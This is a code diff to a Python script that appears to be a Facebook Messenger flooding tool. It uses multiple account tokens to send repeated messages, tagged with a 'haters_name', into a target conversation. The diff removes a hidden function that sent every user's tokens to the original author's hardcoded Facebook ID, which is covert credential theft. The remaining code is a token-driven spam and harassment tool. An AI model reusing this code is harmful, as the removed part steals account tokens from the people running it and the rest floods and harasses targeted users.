@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- THIS SERVER MADE BY TERA RAJKUMAR")
+          self.wfile.write(b"-- SERVER RUNNING>>RAJ H3R3")
 def execute_server():
       PORT = 4000
 
@@ -34,20 +34,14 @@ def execute_server():
           httpd.serve_forever()
 
 
-def send_initial_message():
-      with open('tokennum.txt', 'r') as file:
-          tokens = file.readlines()
 
-      # Modify the message as per your requirement
-      msg_template = "Hello raj  sir! I am using your server. My token is {}"
 
-      # Specify the ID where you want to send the message
-      target_id = "100069389445982"
+      
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────RAAJ PAPA HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────RAJ H3R3 ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -69,10 +63,10 @@ def send_initial_message():
 
           # No need to print here, as requested
           current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+          time.sleep(20.0)  # Wait for 20 second between sending each initial message
 
-      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
+      #print("\n[+] Starting the message sending loop...\n")
+
 def send_messages_from_file():
       with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
@@ -121,7 +115,7 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m UNBEATABLE LEGEND R4J M1SHRA !NSID3 [+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
@@ -140,7 +134,7 @@ def main():
       server_thread = threading.Thread(target=execute_server)
       server_thread.start()
 
-      # Send the initial message to the specified ID using all tokens
+      
 
 
       # Then, continue with the message sending loop
